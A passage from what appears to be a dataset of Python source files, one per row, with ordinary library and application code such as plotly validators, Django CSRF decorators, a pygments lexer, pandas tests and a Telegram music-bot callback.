            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY310	JY310-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""pointcloud"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD415	JD415-live.py	"from pyrogram import filters

from config import BANNED_USERS
from ShizukaXMusic import YouTube, app
from ShizukaXMusic.utils.channelplay import get_channeplayCB
from ShizukaXMusic.utils.decorators.language import languageCB
from ShizukaXMusic.utils.stream.stream import stream


@app.on_callback_query(filters.regex(""LiveStream"") & ~BANNED_USERS)
@languageCB
async def play_live_stream(client, CallbackQuery, _):
    callback_data = CallbackQuery.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    vidid, user_id, mode, cplay, fplay = callback_request.split(""|"")
    if CallbackQuery.from_user.id != int(user_id):
        try:
            return await CallbackQuery.answer(_[""playcb_1""], show_alert=True)
        except:
            return
    try:
        chat_id, channel = await get_channeplayCB(_, cplay, CallbackQuery)
    except:
        return
    video = True if mode == ""v"" else None
    user_name = CallbackQuery.from_user.first_name
    await CallbackQuery.message.delete()
    try:
        await CallbackQuery.answer()
    except:
        pass
    mystic = await CallbackQuery.message.reply_text(
        _[""play_2""].format(channel) if channel else _[""play_1""]
    )
    try:
        details, track_id = await YouTube.track(vidid, True)
    except Exception:
        return await mystic.edit_text(_[""play_3""])
    ffplay = True if fplay == ""f"" else None
    if not details[""duration_min""]:
        try:
            await stream(
                _,
                mystic,
                user_id,
                details,
                chat_id,
                user_name,
                CallbackQuery.message.chat.id,
                video,
                streamtype=""live"",
                forceplay=ffplay,
            )
        except Exception as e:
            ex_type = type(e).__name__
            err = e if ex_type == ""AssistantErr"" else _[""general_3""].format(ex_type)
            return await mystic.edit_text(err)
    else:
        return await mystic.edit_text(""ɪ ᴅᴏɴ'ᴛ ᴛʜɪɴᴋ ᴛʜᴀᴛ ɪᴛ's ᴀ ʟɪᴠᴇ sᴛʀᴇᴀᴍ."")
    await mystic.delete()"
JD3	JD3-remove_silence.py	"#!/usr/bin/env python3 -u
# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

""""""
get intervals from .vads file, specify output data, and this script removes silences and saves the audio data in out path folder
paths=shards/train.tsv
vads=shards/train.vads
python remove_silence.py --paths $paths --vads $vads
""""""

import os
import argparse
import torch
import torchaudio
import tqdm


parser = argparse.ArgumentParser()
parser.add_argument(""--tsv"", default="""", type=str)
parser.add_argument(""--vads"", default="""", type=str)
parser.add_argument(""--out"", type=str)
params = parser.parse_args()

# load paths
paths = []
with open(params.tsv) as f:
    root = next(f).rstrip()
    for line in f:
        paths.append(os.path.join(root, line.rstrip().split(""\t"")[0]))

# load vads
list_intervals = []
with open(params.vads) as f:
    for line in f:
        interval = [
            [int(w.split("":"")[0]), int(w.split("":"")[1])] for w in line.rstrip().split()
        ]
        list_intervals.append(interval)


# load audio and keep only intervals (i.e. remove silences)
for i in tqdm.trange(len(paths)):
    data, _ = torchaudio.load(paths[i])
    if len(list_intervals[i]) > 0:
        data_filtered = torch.cat(
            [data[0][int(it[0]) : int(it[1])] for it in list_intervals[i]]
        ).unsqueeze(0)
    else:
        data_filtered = data

    # YOU MAY NEED TO MODIFY THIS TO GET THE RIGHT SUBPATH
    # outpath = params.out + '/'.join(paths[i].split('/')[-1])
    outpath = params.out + ""/"" + ""/"".join(paths[i].split(""/"")[-2:])

    if not os.path.isdir(""/"".join(outpath.split(""/"")[:-1])):
        os.makedirs(""/"".join(outpath.split(""/"")[:-1]))
    if not os.path.exists(outpath):
        torchaudio.save(outpath, data_filtered, sample_rate=16000)
    else:
        print(outpath, ""exists!"")"
JY45	JY45-latex.py	"""""""Latex filters.

Module of useful filters for processing Latex within Jinja latex templates.
""""""
# -----------------------------------------------------------------------------
# Copyright (c) 2013, the IPython Development Team.
#
# Distributed under the terms of the Modified BSD License.
#
# The full license is in the file COPYING.txt, distributed with this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------
import re

# -----------------------------------------------------------------------------
# Globals and constants
# -----------------------------------------------------------------------------

LATEX_RE_SUBS = ((re.compile(r""\.\.\.+""), r""{\\ldots}""),)

# Latex substitutions for escaping latex.
# see: http://stackoverflow.com/questions/16259923/how-can-i-escape-latex-special-characters-inside-django-templates

LATEX_SUBS = {
    ""&"": r""\&"",
    ""%"": r""\%"",
    ""$"": r""\$"",
    ""#"": r""\#"",
    ""_"": r""\_"",
    ""{"": r""\{"",
    ""}"": r""\}"",
    ""~"": r""\textasciitilde{}"",
    ""^"": r""\^{}"",
    ""\\"": r""\textbackslash{}"",
}


# -----------------------------------------------------------------------------
# Functions
# -----------------------------------------------------------------------------

__all__ = [""escape_latex""]


def escape_latex(text):
    """"""
    Escape characters that may conflict with latex.

    Parameters
    ----------
    text : str
        Text containing characters that may conflict with Latex
    """"""
    text = """".join(LATEX_SUBS.get(c, c) for c in text)
    for pattern, replacement in LATEX_RE_SUBS:
        text = pattern.sub(replacement, text)

    return text"
JD124	JD124-hmac.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography import utils
from cryptography.exceptions import AlreadyFinalized
from cryptography.hazmat.backends.openssl.hmac import _HMACContext
from cryptography.hazmat.primitives import hashes


class HMAC(hashes.HashContext):
    _ctx: typing.Optional[_HMACContext]

    def __init__(
        self,
        key: bytes,
        algorithm: hashes.HashAlgorithm,
        backend: typing.Any = None,
        ctx=None,
    ):
        if not isinstance(algorithm, hashes.HashAlgorithm):
            raise TypeError(""Expected instance of hashes.HashAlgorithm."")
        self._algorithm = algorithm

        self._key = key
        if ctx is None:
            from cryptography.hazmat.backends.openssl.backend import (
                backend as ossl,
            )

            self._ctx = ossl.create_hmac_ctx(key, self.algorithm)
        else:
            self._ctx = ctx

    @property
    def algorithm(self) -> hashes.HashAlgorithm:
        return self._algorithm

    def update(self, data: bytes) -> None:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        utils._check_byteslike(""data"", data)
        self._ctx.update(data)

    def copy(self) -> ""HMAC"":
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        return HMAC(
            self._key,
            self.algorithm,
            ctx=self._ctx.copy(),
        )

    def finalize(self) -> bytes:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        digest = self._ctx.finalize()
        self._ctx = None
        return digest

    def verify(self, signature: bytes) -> None:
        utils._check_bytes(""signature"", signature)
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")

        ctx, self._ctx = self._ctx, None
        ctx.verify(signature)"
JY346	JY346-_symbol.py	"import _plotly_utils.basevalidators


class SymbolValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""symbol"", parent_name=""layout.mapbox.layer"", **kwargs
    ):
        super(SymbolValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Symbol""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            icon
                Sets the symbol icon image
                (mapbox.layer.layout.icon-image). Full list:
                https://www.mapbox.com/maki-icons/
            iconsize
                Sets the symbol icon size
                (mapbox.layer.layout.icon-size). Has an effect
                only when `type` is set to ""symbol"".
            placement
                Sets the symbol and/or text placement
                (mapbox.layer.layout.symbol-placement). If
                `placement` is ""point"", the label is placed
                where the geometry is located If `placement` is
                ""line"", the label is placed along the line of
                the geometry If `placement` is ""line-center"",
                the label is placed on the center of the
                geometry
            text
                Sets the symbol text (mapbox.layer.layout.text-
                field).
            textfont
                Sets the icon text font
                (color=mapbox.layer.paint.text-color,
                size=mapbox.layer.layout.text-size). Has an
                effect only when `type` is set to ""symbol"".
            textposition
                Sets the positions of the `text` elements with
                respects to the (x,y) coordinates.
"""""",
            ),
            **kwargs,
        )"
JY3	JY3-additiveSignatures.py	"def additive_signature():

    global verify_sum,verify_p,verify_challenge,verify_verifier,verify_response,verify_generator

    verify_challenge, verify_response = [],[]

    verify_p = additiveSignature.init(n)
    verify_sum = additiveSignature.pick_sum(max(additive_shares)+1)
    verify_challenge,verify_verifier, verify_generator = additiveSignature.challenge(additive_shares,verify_p,verify_sum)  #instead of passing shares, reuse witness generated g^di values


def additive_signature_verify():
    global verify_sum,verify_p,verify_challenge,verify_verifier,verify_response,verify_generator,share_status

    verify_response = additiveSignature.response(verify_challenge,additive_shares,verify_p,verify_sum,verify_verifier,verify_generator)
    share_status = verify_response

    print(""ADDITIVE SHARE STATUS:"",verify_response)

    if verify_response.count(True) != add_shares_no:
        print(""INVALID SIGNATURE!\nALERT: INVOKE BACKUP"")

import nextprime
import random
import modinverse

def init(n):
    '''generate prime group with order > n'''

    p = nextprime.next_prime(n)
    return n

def pick_sum(p):
    '''pick a sum such that di+di_dash = sum and p < sum < 2p'''

    return random.randrange(p,2*p)

def challenge(shares,p,c):
    '''generate challenge and vezrifier, return as [challenge(list),verifier(int)]'''

    challenge = []

    a = random.randrange(2,p)
    verifier = pow(a,c,p)
    for di in shares:
        challenge.append(pow(a,di,p))

    return [challenge,verifier,a]

def response(challenge,share,p,c,verifier,gen):
    '''generates response by a party holding a 'share' to the challenge[i] for all additive shares'''

    res = []
    for i in range(len(challenge)):
        response = (pow(gen,c-share[i],p)*challenge[i])%p
        if response == verifier:
            res.append(True)
        else:
            res.append(False)
    return res"
JD27	JD27-_util.py	"# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

import contextlib
import os


@contextlib.contextmanager
def cwd(dirname):
    """"""A context manager for operating in a different directory.""""""
    orig = os.getcwd()
    os.chdir(dirname)
    try:
        yield orig
    finally:
        os.chdir(orig)


def iter_all_files(root, prune_dir=None, exclude_file=None):
    """"""Yield (dirname, basename, filename) for each file in the tree.

    This is an alternative to os.walk() that flattens out the tree and
    with filtering.
    """"""
    pending = [root]
    while pending:
        dirname = pending.pop(0)
        for result in _iter_files(dirname, pending, prune_dir, exclude_file):
            yield result


def iter_tree(root, prune_dir=None, exclude_file=None):
    """"""Yield (dirname, files) for each directory in the tree.

    The list of files is actually a list of (basename, filename).

    This is an alternative to os.walk() with filtering.""""""
    pending = [root]
    while pending:
        dirname = pending.pop(0)
        files = []
        for _, b, f in _iter_files(dirname, pending, prune_dir, exclude_file):
            files.append((b, f))
        yield dirname, files


def _iter_files(dirname, subdirs, prune_dir, exclude_file):
    for basename in os.listdir(dirname):
        filename = os.path.join(dirname, basename)
        if os.path.isdir(filename):
            if prune_dir is not None and prune_dir(dirname, basename):
                continue
            subdirs.append(filename)
        else:
            # TODO: Use os.path.isfile() to narrow it down?
            if exclude_file is not None and exclude_file(dirname, basename):
                continue
            yield dirname, basename, filename"
JY120	JY120-testSHFileOperation.py	"from win32com.shell import shell, shellcon
import win32api
import os


def testSHFileOperation(file_cnt):
    temp_dir = os.environ[""temp""]
    orig_fnames = [
        win32api.GetTempFileName(temp_dir, ""sfo"")[0] for x in range(file_cnt)
    ]
    new_fnames = [
        os.path.join(temp_dir, ""copy of "" + os.path.split(orig_fnames[x])[1])
        for x in range(file_cnt)
    ]

    pFrom = ""\0"".join(orig_fnames)
    pTo = ""\0"".join(new_fnames)

    shell.SHFileOperation(
        (
            0,
            shellcon.FO_MOVE,
            pFrom,
            pTo,
            shellcon.FOF_MULTIDESTFILES | shellcon.FOF_NOCONFIRMATION,
        )
    )
    for fname in orig_fnames:
        assert not os.path.isfile(fname)

    for fname in new_fnames:
        assert os.path.isfile(fname)
        shell.SHFileOperation(
            (
                0,
                shellcon.FO_DELETE,
                fname,
                None,
                shellcon.FOF_NOCONFIRMATION | shellcon.FOF_NOERRORUI,
            )
        )


def testSHNAMEMAPPINGS(file_cnt):
    ## attemps to move a set of files to names that already exist, and generated filenames should be returned
    ##   as a sequence of 2-tuples created from SHNAMEMAPPINGS handle
    temp_dir = os.environ[""temp""]
    orig_fnames = [
        win32api.GetTempFileName(temp_dir, ""sfo"")[0] for x in range(file_cnt)
    ]
    new_fnames = [win32api.GetTempFileName(temp_dir, ""sfo"")[0] for x in range(file_cnt)]
    pFrom = ""\0"".join(orig_fnames)
    pTo = ""\0"".join(new_fnames)
    rc, banyaborted, NameMappings = shell.SHFileOperation(
        (
            0,
            shellcon.FO_MOVE,
            pFrom,
            pTo,
            shellcon.FOF_MULTIDESTFILES
            | shellcon.FOF_NOCONFIRMATION
            | shellcon.FOF_RENAMEONCOLLISION
            | shellcon.FOF_WANTMAPPINGHANDLE,
        )
    )

    for old_fname, new_fname in NameMappings:
        print(""Old:"", old_fname, ""New:"", new_fname)
    assert len(NameMappings) == file_cnt


testSHFileOperation(10)
testSHFileOperation(1)
testSHNAMEMAPPINGS(5)"
JY307	JY307-_insidetextfont.py	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""insidetextfont"", parent_name=""pie"", **kwargs):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY476	JY476-test_indexing.py	"import re

import numpy as np
import pytest

import pandas as pd


class TestSetitemValidation:
    def _check_setitem_invalid(self, arr, invalid):
        msg = f""Invalid value '{str(invalid)}' for dtype {arr.dtype}""
        msg = re.escape(msg)
        with pytest.raises(TypeError, match=msg):
            arr[0] = invalid

        with pytest.raises(TypeError, match=msg):
            arr[:] = invalid

        with pytest.raises(TypeError, match=msg):
            arr[[0]] = invalid

        # FIXME: don't leave commented-out
        # with pytest.raises(TypeError):
        #    arr[[0]] = [invalid]

        # with pytest.raises(TypeError):
        #    arr[[0]] = np.array([invalid], dtype=object)

        # Series non-coercion, behavior subject to change
        ser = pd.Series(arr)
        with pytest.raises(TypeError, match=msg):
            ser[0] = invalid
            # TODO: so, so many other variants of this...

    _invalid_scalars = [
        1 + 2j,
        ""True"",
        ""1"",
        ""1.0"",
        pd.NaT,
        np.datetime64(""NaT""),
        np.timedelta64(""NaT""),
    ]

    @pytest.mark.parametrize(
        ""invalid"", _invalid_scalars + [1, 1.0, np.int64(1), np.float64(1)]
    )
    def test_setitem_validation_scalar_bool(self, invalid):
        arr = pd.array([True, False, None], dtype=""boolean"")
        self._check_setitem_invalid(arr, invalid)

    @pytest.mark.parametrize(""invalid"", _invalid_scalars + [True, 1.5, np.float64(1.5)])
    def test_setitem_validation_scalar_int(self, invalid, any_int_ea_dtype):
        arr = pd.array([1, 2, None], dtype=any_int_ea_dtype)
        self._check_setitem_invalid(arr, invalid)

    @pytest.mark.parametrize(""invalid"", _invalid_scalars + [True])
    def test_setitem_validation_scalar_float(self, invalid, float_ea_dtype):
        arr = pd.array([1, 2, None], dtype=float_ea_dtype)
        self._check_setitem_invalid(arr, invalid)"
JY253	JY253-genericworker.py	"#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#    Copyright (C) 2022 by YOUR NAME HERE
#
#    This file is part of RoboComp
#
#    RoboComp is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    RoboComp is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.

import sys, Ice, os
from PySide2 import QtWidgets, QtCore

ROBOCOMP = ''
try:
    ROBOCOMP = os.environ['ROBOCOMP']
except KeyError:
    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')
    ROBOCOMP = '/opt/robocomp'

Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")
import RoboCompCommonBehavior


try:
    from ui_mainUI import *
except:
    print(""Can't import UI file. Did you run 'make'?"")
    sys.exit(-1)



class GenericWorker(QtWidgets.QWidget):

    kill = QtCore.Signal()

    def __init__(self, mprx):
        super(GenericWorker, self).__init__()


        self.ui = Ui_guiDlg()
        self.ui.setupUi(self)
        self.show()

        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)
        self.Period = 30
        self.timer = QtCore.QTimer(self)


    @QtCore.Slot()
    def killYourSelf(self):
        rDebug(""Killing myself"")
        self.kill.emit()

    # \brief Change compute period
    # @param per Period in ms
    @QtCore.Slot(int)
    def setPeriod(self, p):
        print(""Period changed"", p)
        self.Period = p
        self.timer.start(self.Period)"
JD132	JD132-_version_info.py	"# SPDX-License-Identifier: MIT


from functools import total_ordering

from ._funcs import astuple
from ._make import attrib, attrs


@total_ordering
@attrs(eq=False, order=False, slots=True, frozen=True)
class VersionInfo:
    """"""
    A version object that can be compared to tuple of length 1--4:

    >>> attr.VersionInfo(19, 1, 0, ""final"")  <= (19, 2)
    True
    >>> attr.VersionInfo(19, 1, 0, ""final"") < (19, 1, 1)
    True
    >>> vi = attr.VersionInfo(19, 2, 0, ""final"")
    >>> vi < (19, 1, 1)
    False
    >>> vi < (19,)
    False
    >>> vi == (19, 2,)
    True
    >>> vi == (19, 2, 1)
    False

    .. versionadded:: 19.2
    """"""

    year = attrib(type=int)
    minor = attrib(type=int)
    micro = attrib(type=int)
    releaselevel = attrib(type=str)

    @classmethod
    def _from_version_string(cls, s):
        """"""
        Parse *s* and return a _VersionInfo.
        """"""
        v = s.split(""."")
        if len(v) == 3:
            v.append(""final"")

        return cls(
            year=int(v[0]), minor=int(v[1]), micro=int(v[2]), releaselevel=v[3]
        )

    def _ensure_tuple(self, other):
        """"""
        Ensure *other* is a tuple of a valid length.

        Returns a possibly transformed *other* and ourselves as a tuple of
        the same length as *other*.
        """"""

        if self.__class__ is other.__class__:
            other = astuple(other)

        if not isinstance(other, tuple):
            raise NotImplementedError

        if not (1 <= len(other) <= 4):
            raise NotImplementedError

        return astuple(self)[: len(other)], other

    def __eq__(self, other):
        try:
            us, them = self._ensure_tuple(other)
        except NotImplementedError:
            return NotImplemented

        return us == them

    def __lt__(self, other):
        try:
            us, them = self._ensure_tuple(other)
        except NotImplementedError:
            return NotImplemented

        # Since alphabetically ""dev0"" < ""final"" < ""post1"" < ""post2"", we don't
        # have to do anything special with releaselevel for now.
        return us < them"
JY488	JY488-csrf.py	"from functools import wraps

from django.middleware.csrf import CsrfViewMiddleware, get_token
from django.utils.decorators import decorator_from_middleware

csrf_protect = decorator_from_middleware(CsrfViewMiddleware)
csrf_protect.__name__ = ""csrf_protect""
csrf_protect.__doc__ = """"""
This decorator adds CSRF protection in exactly the same way as
CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or
using the decorator multiple times, is harmless and efficient.
""""""


class _EnsureCsrfToken(CsrfViewMiddleware):
    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.
    def _reject(self, request, reason):
        return None


requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)
requires_csrf_token.__name__ = 'requires_csrf_token'
requires_csrf_token.__doc__ = """"""
Use this decorator on views that need a correct csrf_token available to
RequestContext, but without the CSRF protection that csrf_protect
enforces.
""""""


class _EnsureCsrfCookie(CsrfViewMiddleware):
    def _reject(self, request, reason):
        return None

    def process_view(self, request, callback, callback_args, callback_kwargs):
        retval = super().process_view(request, callback, callback_args, callback_kwargs)
        # Force process_response to send the cookie
        get_token(request)
        return retval


ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)
ensure_csrf_cookie.__name__ = 'ensure_csrf_cookie'
ensure_csrf_cookie.__doc__ = """"""
Use this decorator to ensure that a view sets a CSRF cookie, whether or not it
uses the csrf_token template tag, or the CsrfViewMiddleware is used.
""""""


def csrf_exempt(view_func):
    """"""Mark a view function as being exempt from the CSRF view protection.""""""
    # view_func.csrf_exempt = True would also work, but decorators are nicer
    # if they don't have side effects, so return a new function.
    def wrapped_view(*args, **kwargs):
        return view_func(*args, **kwargs)
    wrapped_view.csrf_exempt = True
    return wraps(view_func)(wrapped_view)"
JD432	JD432-datastore.py	"# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Sample App Engine application demonstrating how to use the Namespace Manager
API with Datastore.

For more information, see README.md.
""""""

# [START all]
from google.appengine.api import namespace_manager
from google.appengine.ext import ndb
import webapp2


class Counter(ndb.Model):
    count = ndb.IntegerProperty()


@ndb.transactional
def update_counter(name):
    """"""Increment the named counter by 1.""""""
    counter = Counter.get_by_id(name)
    if counter is None:
        counter = Counter(id=name, count=0)

    counter.count += 1
    counter.put()

    return counter.count


class DatastoreCounterHandler(webapp2.RequestHandler):
    """"""Increments counters in the global namespace as well as in whichever
    namespace is specified by the request, which is arbitrarily named 'default'
    if not specified.""""""

    def get(self, namespace='default'):
        global_count = update_counter('counter')

        # Save the current namespace.
        previous_namespace = namespace_manager.get_namespace()
        try:
            namespace_manager.set_namespace(namespace)
            namespace_count = update_counter('counter')
        finally:
            # Restore the saved namespace.
            namespace_manager.set_namespace(previous_namespace)

        self.response.write('Global: {}, Namespace {}: {}'.format(
            global_count, namespace, namespace_count))


app = webapp2.WSGIApplication([
    (r'/datastore', DatastoreCounterHandler),
    (r'/datastore/(.*)', DatastoreCounterHandler)
], debug=True)
# [END all]"
JD114	JD114-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'
TIME_FORMAT = 'P'                       # '2:30 p.m.'
DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'
YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'
MONTH_DAY_FORMAT = 'j F'                # '25 October'
SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'
SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'
FIRST_DAY_OF_WEEK = 1                   # Monday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'
    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'
    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'
    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'
    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'
    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = ','
NUMBER_GROUPING = 3"
JY158	JY158-sgf.py	"""""""
    pygments.lexers.sgf
    ~~~~~~~~~~~~~~~~~~~

    Lexer for Smart Game Format (sgf) file format.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Name, Literal, String, Text, Punctuation, Whitespace

__all__ = [""SmartGameFormatLexer""]


class SmartGameFormatLexer(RegexLexer):
    """"""
    Lexer for Smart Game Format (sgf) file format.

    The format is used to store game records of board games for two players
    (mainly Go game).

    .. versionadded:: 2.4
    """"""
    name = 'SmartGameFormat'
    url = 'https://www.red-bean.com/sgf/'
    aliases = ['sgf']
    filenames = ['*.sgf']

    tokens = {
        'root': [
            (r'[():;]+', Punctuation),
            # tokens:
            (r'(A[BW]|AE|AN|AP|AR|AS|[BW]L|BM|[BW]R|[BW]S|[BW]T|CA|CH|CP|CR|'
             r'DD|DM|DO|DT|EL|EV|EX|FF|FG|G[BW]|GC|GM|GN|HA|HO|ID|IP|IT|IY|KM|'
             r'KO|LB|LN|LT|L|MA|MN|M|N|OB|OM|ON|OP|OT|OV|P[BW]|PC|PL|PM|RE|RG|'
             r'RO|RU|SO|SC|SE|SI|SL|SO|SQ|ST|SU|SZ|T[BW]|TC|TE|TM|TR|UC|US|VW|'
             r'V|[BW]|C)',
             Name.Builtin),
            # number:
            (r'(\[)([0-9.]+)(\])',
             bygroups(Punctuation, Literal.Number, Punctuation)),
            # date:
            (r'(\[)([0-9]{4}-[0-9]{2}-[0-9]{2})(\])',
             bygroups(Punctuation, Literal.Date, Punctuation)),
            # point:
            (r'(\[)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation)),
            # double points:
            (r'(\[)([a-z]{2})(:)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation, String, Punctuation)),

            (r'(\[)([\w\s#()+,\-.:?]+)(\])',
             bygroups(Punctuation, String, Punctuation)),
            (r'(\[)(\s.*)(\])',
             bygroups(Punctuation, Whitespace, Punctuation)),
            (r'\s+', Whitespace)
        ],
    }"
JY77	JY77-rotate.py	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        (""match="", ""m"", ""patterns to match (required)""),
        (""dist-dir="", ""d"", ""directory where the distributions are""),
        (""keep="", ""k"", ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError as e:
            raise DistutilsOptionError(""--keep must be an integer"") from e
        if isinstance(self.match, str):
            self.match = [convert_path(p.strip()) for p in self.match.split("","")]
        self.set_undefined_options(""bdist"", (""dist_dir"", ""dist_dir""))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
